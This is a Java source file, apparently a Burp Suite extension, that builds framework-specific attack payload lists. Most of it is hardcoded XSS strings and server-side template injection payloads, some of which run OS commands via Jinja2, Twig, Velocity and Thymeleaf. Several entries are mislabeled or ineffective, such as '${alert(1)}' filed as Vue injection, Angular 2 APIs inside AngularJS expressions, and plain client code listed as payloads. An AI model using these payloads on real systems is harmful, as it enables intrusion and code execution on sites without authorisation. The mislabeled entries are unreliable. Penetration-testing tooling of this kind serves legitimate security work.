package burp;

import java.util.*;

/**
 * ADVANCED: Application-Type Specific Payload Generator
 * Generates robust attack payloads based on detected application type
 * This makes the extension unique by adapting to application architecture
 */
public class ApplicationTypeSpecificPayloadGenerator {
    
    private final IBurpExtenderCallbacks callbacks;
    private final Settings settings;
    
    // React-specific payloads
    private static final String[] REACT_SPECIFIC_PAYLOADS = {
        // React JSX injection
        "{dangerouslySetInnerHTML:{__html:'<img src=x onerror=alert(1)>'}}",
        "{dangerouslySetInnerHTML:{__html:'<svg onload=alert(1)>'}}",
        "React.createElement('img',{src:'x',onError:alert})",
        "ReactDOM.render('<script>alert(1)</script>',document.body)",
        "{__html:'<script>alert(1)</script>'}",
        // React props injection
        "onClick={alert}",
        "onMouseOver={alert}",
        "onError={alert}",
        "onLoad={alert}",
        // React state manipulation
        "setState({x:'<img src=x onerror=alert(1)>'})",
        "this.state.x='<script>alert(1)</script>'",
        // React Router XSS
        "history.push('/<script>alert(1)</script>')",
        "location.href='javascript:alert(1)'"
    };
    
    // Angular-specific payloads
    private static final String[] ANGULAR_SPECIFIC_PAYLOADS = {
        // Angular template injection
        "{{constructor.constructor('alert(1)')()}}",
        "{{$eval.constructor('alert(1)')()}}",
        "{{$new.constructor('alert(1)')()}}",
        "{{$get.constructor('alert(1)')()}}",
        "{{$apply.constructor('alert(1)')()}}",
        "{{$compile('alert(1)')()}}",
        // Angular expression injection
        "{{7*7}}",
        "{{constructor.constructor('alert(1)')()}}",
        "{{$eval('alert(1)')}}",
        "{{$new('alert(1)')}}",
        // Angular ng-bind-html
        "ng-bind-html=\"'<script>alert(1)</script>'\"",
        "ng-bind-html=\"$sce.trustAsHtml('<script>alert(1)</script>')\"",
        // Angular sanitization bypass
        "{{$sanitize.bypassSecurityTrustHtml('<script>alert(1)</script>')}}",
        "{{$sce.trustAsHtml('<script>alert(1)</script>')}}",
        // Angular event handlers
        "ng-click=\"alert(1)\"",
        "ng-mouseover=\"alert(1)\"",
        "ng-focus=\"alert(1)\""
    };
    
    // Vue.js-specific payloads
    private static final String[] VUE_SPECIFIC_PAYLOADS = {
        // Vue template injection
        "${alert(1)}",
        "${7*7}",
        "${constructor.constructor('alert(1)')()}",
        "${global.alert(1)}",
        "${window.alert(1)}",
        // Vue v-html directive
        "v-html=\"'<script>alert(1)</script>'\"",
        "v-html=\"$options.filters.unsafe('<script>alert(1)</script>')\"",
        // Vue event handlers
        "@click=\"alert(1)\"",
        "@mouseover=\"alert(1)\"",
        "@focus=\"alert(1)\"",
        "v-on:click=\"alert(1)\"",
        // Vue computed properties
        "computed:{x:function(){alert(1)}}",
        "methods:{x:function(){alert(1)}}"
    };
    
    // GraphQL-specific payloads
    private static final String[] GRAPHQL_SPECIFIC_PAYLOADS = {
        // GraphQL query injection
        "query{__schema{types{name}}}",
        "query{__type(name:\"<script>alert(1)</script>\"){name}}",
        "mutation{createUser(name:\"<script>alert(1)</script>\"){id}}",
        "query{user(name:\"<script>alert(1)</script>\"){id}}",
        // GraphQL introspection XSS
        "{__schema{queryType{name}}}",
        "{__type(name:\"User\"){fields{name}}}",
        // GraphQL field injection
        "query{user{name:\"<script>alert(1)</script>\"}}",
        "mutation{updateUser(id:1,name:\"<script>alert(1)</script>\")}"
    };
    
    // SPA (Single Page Application) payloads
    private static final String[] SPA_SPECIFIC_PAYLOADS = {
        // Hash-based XSS
        "#<script>alert(1)</script>",
        "#javascript:alert(1)",
        "#<img src=x onerror=alert(1)>",
        // History API XSS
        "history.pushState({},'','<script>alert(1)</script>')",
        "history.replaceState({},'','<script>alert(1)</script>')",
        // Location-based XSS
        "location.hash='<script>alert(1)</script>'",
        "location.search='?x=<script>alert(1)</script>'",
        // PostMessage XSS
        "postMessage('<script>alert(1)</script>','*')",
        "window.postMessage('<script>alert(1)</script>','*')",
        // React Router XSS
        "/<script>alert(1)</script>",
        "/#/<script>alert(1)</script>",
        "?route=<script>alert(1)</script>",
        "?path=<script>alert(1)</script>",
        "?page=<script>alert(1)</script>",
        // Vue Router XSS
        "?to=<script>alert(1)</script>",
        "?path=<script>alert(1)</script>",
        "?name=<script>alert(1)</script>",
        // Angular Router XSS
        "?route=<script>alert(1)</script>",
        "?path=<script>alert(1)</script>",
        // State Management XSS (Redux, Vuex, MobX, Zustand)
        "dispatch({type:'<script>alert(1)</script>',payload:{}})",
        "commit('<script>alert(1)</script>',{})",
        "setState({x:'<script>alert(1)</script>'})",
        "store.dispatch({type:'<script>alert(1)</script>'})",
        "this.$store.commit('<script>alert(1)</script>')",
        // SPA Fetch/Axios Response Handling XSS
        "fetch('/api').then(r=>r.json()).then(d=>eval(d.x))",
        "axios.get('/api').then(r=>document.body.innerHTML=r.data.x)",
        "fetch('/api').then(r=>r.text()).then(t=>eval(t))",
        "axios.post('/api',{}).then(r=>eval(r.data.payload))",
        // SPA Hydration XSS (SSR/CSR mismatch)
        "__NEXT_DATA__='<script>alert(1)</script>'",
        "window.__INITIAL_STATE__='<script>alert(1)</script>'",
        "window.__PRELOADED_STATE__='<script>alert(1)</script>'",
        "window.__APOLLO_STATE__='<script>alert(1)</script>'",
        // SPA Storage-based XSS
        "localStorage.setItem('x','<script>alert(1)</script>')",
        "sessionStorage.setItem('x','<script>alert(1)</script>')",
        "IndexedDB.open('x').then(db=>db.put('<script>alert(1)</script>'))"
    };
    
    // Template engine payloads
    private static final String[] TEMPLATE_ENGINE_PAYLOADS = {
        // Handlebars
        "{{7*7}}",
        "{{constructor.constructor('alert(1)')()}}",
        "{{#if constructor.constructor}}alert(1){{/if}}",
        // Mustache
        "{{7*7}}",
        "{{#section}}alert(1){{/section}}",
        // EJS
        "<%=alert(1)%>",
        "<%-alert(1)%>",
        "<%eval('alert(1)')%>",
        // Jinja2
        "{{7*7}}",
        "{{config}}",
        "{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}",
        // Twig
        "{{7*7}}",
        "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
        // Smarty
        "{7*7}",
        "{php}alert(1){/php}",
        // Velocity
        "#set($x=$class.forName('java.lang.Runtime').getRuntime().exec('id'))",
        // Thymeleaf
        "${7*7}",
        "${T(java.lang.Runtime).getRuntime().exec('id')}"
    };
    
    // JSON/API-specific payloads
    private static final String[] JSON_API_PAYLOADS = {
        // JSON injection
        "\";alert(1);//",
        "';alert(1);//",
        "\",\"x\":\"<script>alert(1)</script>\"}",
        // JSONP callback injection
        "callback=<script>alert(1)</script>",
        "jsonp=<script>alert(1)</script>",
        "?callback=alert",
        // JSON path injection
        "$.x='<script>alert(1)</script>'",
        "$[0]='<script>alert(1)</script>'",
        // JSON-LD injection
        "{\"@context\":\"<script>alert(1)</script>\"}",
        "{\"@type\":\"<script>alert(1)</script>\"}",
        // JSON-RPC injection
        "{\"jsonrpc\":\"2.0\",\"method\":\"<script>alert(1)</script>\",\"params\":{}}",
        "{\"jsonrpc\":\"2.0\",\"id\":\"<script>alert(1)</script>\",\"result\":{}}",
        "{\"jsonrpc\":\"2.0\",\"error\":{\"message\":\"<script>alert(1)</script>\"}}",
        // JSON API (jsonapi.org) format injection
        "{\"data\":{\"type\":\"<script>alert(1)</script>\",\"attributes\":{}}}",
        "{\"data\":{\"id\":\"<script>alert(1)</script>\",\"type\":\"user\"}}",
        "{\"included\":[{\"type\":\"<script>alert(1)</script>\"}]}",
        "{\"meta\":{\"author\":\"<script>alert(1)</script>\"}}",
        // JSON deserialization XSS
        "{\"__proto__\":{\"isAdmin\":true,\"x\":\"<script>alert(1)</script>\"}}",
        "{\"constructor\":{\"prototype\":{\"x\":\"<script>alert(1)</script>\"}}}",
        "{\"toString\":\"<script>alert(1)</script>\"}",
        // JWT payload XSS (in claims)
        "{\"sub\":\"<script>alert(1)</script>\",\"name\":\"test\"}",
        "{\"email\":\"<script>alert(1)</script>@domain.com\"}",
        "{\"username\":\"<script>alert(1)</script>\"}",
        // JSON in non-standard contexts
        "data-xss='{\"x\":\"<script>alert(1)</script>\"}'",
        "<meta name=\"xss\" content='{\"x\":\"<script>alert(1)</script>\"}'>",
        "style=\"background:url('data:application/json,{\\\"x\\\":\\\"<script>alert(1)</script>\\\"}');\"",
        "<svg><script>var x={\"y\":\"<script>alert(1)</script>\"};</script></svg>"
    };
    
    // Microservices/API Gateway payloads
    private static final String[] MICROSERVICES_PAYLOADS = {
        // API Gateway XSS
        "X-Forwarded-For: <script>alert(1)</script>",
        "X-Real-IP: <script>alert(1)</script>",
        "X-Original-URL: <script>alert(1)</script>",
        // Service mesh XSS
        "X-Service-Name: <script>alert(1)</script>",
        "X-Microservice: <script>alert(1)</script>",
        // Kubernetes XSS
        "X-Kubernetes-Namespace: <script>alert(1)</script>",
        "X-Pod-Name: <script>alert(1)</script>"
    };
    
    // JAMStack/Static Site payloads
    private static final String[] JAMSTACK_PAYLOADS = {
        // Static site XSS
        "?path=<script>alert(1)</script>",
        "?file=<script>alert(1)</script>",
        "?page=<script>alert(1)</script>",
        // Serverless function XSS
        "?event=<script>alert(1)</script>",
        "?context=<script>alert(1)</script>",
        // CDN edge XSS
        "?cdn=<script>alert(1)</script>",
        "?edge=<script>alert(1)</script>"
    };
    
    public ApplicationTypeSpecificPayloadGenerator(IBurpExtenderCallbacks callbacks, Settings settings) {
        this.callbacks = callbacks;
        this.settings = settings;
    }
    
    /**
     * Generate payloads based on detected application type
     */
    public List<String> generatePayloadsForApplicationType(String applicationType, String contentType, 
                                                          ModernArchitectureDetector.ArchitectureAnalysis archAnalysis) {
        return generatePayloadsForApplicationType(applicationType, contentType, archAnalysis, null);
    }
    
    public List<String> generatePayloadsForApplicationType(String applicationType, String contentType, 
                                                          ModernArchitectureDetector.ArchitectureAnalysis archAnalysis, String responseBody) {
        List<String> payloads = new ArrayList<>();
        
        if (applicationType == null) {
            applicationType = detectApplicationType(archAnalysis);
        }
        
        String lowerAppType = applicationType.toLowerCase();
        String lowerContentType = contentType != null ? contentType.toLowerCase() : "";
        
        // CRITICAL: Analyze response body to determine context for payload relevance
        boolean isHTMLResponse = responseBody != null && (responseBody.contains("<html") || responseBody.contains("<body") || 
                                                           responseBody.contains("<script") || responseBody.contains("<div"));
        boolean isJSONResponse = responseBody != null && (responseBody.trim().startsWith("{") || responseBody.trim().startsWith("["));
        boolean isJSResponse = responseBody != null && (responseBody.contains("function") || responseBody.contains("var ") || 
                                                        responseBody.contains("const ") || responseBody.contains("let "));
        
        // React application - CRITICAL: Only add React payloads if context is relevant
        if (lowerAppType.contains("react") || archAnalysis != null && archAnalysis.getDetectedFrameworks().contains("react")) {
            // React payloads work in HTML (JSX) and JavaScript contexts
            if (isHTMLResponse || isJSResponse || lowerContentType.contains("html") || lowerContentType.contains("javascript")) {
                payloads.addAll(Arrays.asList(REACT_SPECIFIC_PAYLOADS));
                callbacks.printOutput("[ApplicationType] Detected React - Added " + REACT_SPECIFIC_PAYLOADS.length + " React-specific payloads (HTML/JS context)");
            }
        }
        
        // Angular application - CRITICAL: Only add Angular payloads if context is relevant
        if (lowerAppType.contains("angular") || archAnalysis != null && archAnalysis.getDetectedFrameworks().contains("angular")) {
            // Angular payloads work in HTML (templates) and JavaScript contexts
            if (isHTMLResponse || isJSResponse || lowerContentType.contains("html") || lowerContentType.contains("javascript")) {
                payloads.addAll(Arrays.asList(ANGULAR_SPECIFIC_PAYLOADS));
                callbacks.printOutput("[ApplicationType] Detected Angular - Added " + ANGULAR_SPECIFIC_PAYLOADS.length + " Angular-specific payloads (HTML/JS context)");
            }
        }
        
        // Vue.js application - CRITICAL: Only add Vue payloads if context is relevant
        if (lowerAppType.contains("vue") || archAnalysis != null && archAnalysis.getDetectedFrameworks().contains("vue")) {
            // Vue payloads work in HTML (templates) and JavaScript contexts
            if (isHTMLResponse || isJSResponse || lowerContentType.contains("html") || lowerContentType.contains("javascript")) {
                payloads.addAll(Arrays.asList(VUE_SPECIFIC_PAYLOADS));
                callbacks.printOutput("[ApplicationType] Detected Vue.js - Added " + VUE_SPECIFIC_PAYLOADS.length + " Vue-specific payloads (HTML/JS context)");
            }
        }
        
        // GraphQL API - CRITICAL: Only add GraphQL payloads if context is GraphQL
        if (lowerAppType.contains("graphql") || lowerContentType.contains("graphql") || 
            archAnalysis != null && archAnalysis.hasGraphQL()) {
            // GraphQL payloads work in GraphQL query/variable contexts
            if (lowerContentType.contains("graphql") || responseBody != null && 
                (responseBody.contains("query") || responseBody.contains("mutation") || responseBody.contains("__schema"))) {
                payloads.addAll(Arrays.asList(GRAPHQL_SPECIFIC_PAYLOADS));
                callbacks.printOutput("[ApplicationType] Detected GraphQL - Added " + GRAPHQL_SPECIFIC_PAYLOADS.length + " GraphQL-specific payloads");
            }
        }
        
        // SPA (Single Page Application) - CRITICAL: Only add SPA payloads if context is SPA
        if (lowerAppType.contains("spa") || archAnalysis != null && archAnalysis.isSPA()) {
            // SPA payloads work in HTML and JavaScript contexts (router, state management)
            if (isHTMLResponse || isJSResponse || lowerContentType.contains("html") || lowerContentType.contains("javascript")) {
                payloads.addAll(Arrays.asList(SPA_SPECIFIC_PAYLOADS));
                callbacks.printOutput("[ApplicationType] Detected SPA - Added " + SPA_SPECIFIC_PAYLOADS.length + " SPA-specific payloads (HTML/JS context)");
            }
        }
        
        // Template engines - CRITICAL: Only add template payloads if context is template
        if (lowerAppType.contains("template") || lowerContentType.contains("template") ||
            lowerContentType.contains("handlebars") || lowerContentType.contains("mustache") ||
            lowerContentType.contains("ejs") || lowerContentType.contains("jinja") ||
            lowerContentType.contains("twig") || lowerContentType.contains("smarty")) {
            // Template payloads work in HTML contexts where templates are rendered
            if (isHTMLResponse || lowerContentType.contains("html")) {
                payloads.addAll(Arrays.asList(TEMPLATE_ENGINE_PAYLOADS));
                callbacks.printOutput("[ApplicationType] Detected Template Engine - Added " + TEMPLATE_ENGINE_PAYLOADS.length + " template-specific payloads (HTML context)");
            }
        }
        
        // JSON/API - CRITICAL: Only add JSON payloads if context is JSON
        if (lowerContentType.contains("json") || lowerAppType.contains("api") || 
            archAnalysis != null && archAnalysis.isModernAPI()) {
            // JSON payloads work in JSON contexts
            if (isJSONResponse || lowerContentType.contains("json")) {
                payloads.addAll(Arrays.asList(JSON_API_PAYLOADS));
                callbacks.printOutput("[ApplicationType] Detected JSON/API - Added " + JSON_API_PAYLOADS.length + " JSON/API-specific payloads (JSON context)");
            }
        }
        
        // Microservices - CRITICAL: Only add microservices payloads if context is relevant
        if (lowerAppType.contains("microservice") || archAnalysis != null && archAnalysis.isMicroservices()) {
            // Microservices payloads work in API/JSON contexts
            if (isJSONResponse || lowerContentType.contains("json") || lowerContentType.contains("api")) {
                payloads.addAll(Arrays.asList(MICROSERVICES_PAYLOADS));
                callbacks.printOutput("[ApplicationType] Detected Microservices - Added " + MICROSERVICES_PAYLOADS.length + " microservices-specific payloads (API context)");
            }
        }
        
        // JAMStack - CRITICAL: Only add JAMStack payloads if context is relevant
        if (lowerAppType.contains("jamstack") || lowerAppType.contains("static") || 
            archAnalysis != null && archAnalysis.isJAMStack()) {
            // JAMStack payloads work in HTML and static file contexts
            if (isHTMLResponse || lowerContentType.contains("html") || lowerContentType.contains("text")) {
                payloads.addAll(Arrays.asList(JAMSTACK_PAYLOADS));
                callbacks.printOutput("[ApplicationType] Detected JAMStack - Added " + JAMSTACK_PAYLOADS.length + " JAMStack-specific payloads (HTML/static context)");
            }
        }
        
        return payloads;
    }
    
    /**
     * Detect application type from architecture analysis
     */
    private String detectApplicationType(ModernArchitectureDetector.ArchitectureAnalysis archAnalysis) {
        if (archAnalysis == null) {
            return "UNKNOWN";
        }
        
        List<String> frameworks = archAnalysis.getDetectedFrameworks();
        if (frameworks.contains("react")) {
            return "REACT";
        } else if (frameworks.contains("angular")) {
            return "ANGULAR";
        } else if (frameworks.contains("vue")) {
            return "VUE";
        } else if (archAnalysis.hasGraphQL()) {
            return "GRAPHQL";
        } else if (archAnalysis.isSPA()) {
            return "SPA";
        } else if (archAnalysis.isMicroservices()) {
            return "MICROSERVICES";
        } else if (archAnalysis.isJAMStack()) {
            return "JAMSTACK";
        } else if (archAnalysis.isModernAPI()) {
            return "API";
        }
        
        return "UNKNOWN";
    }
}

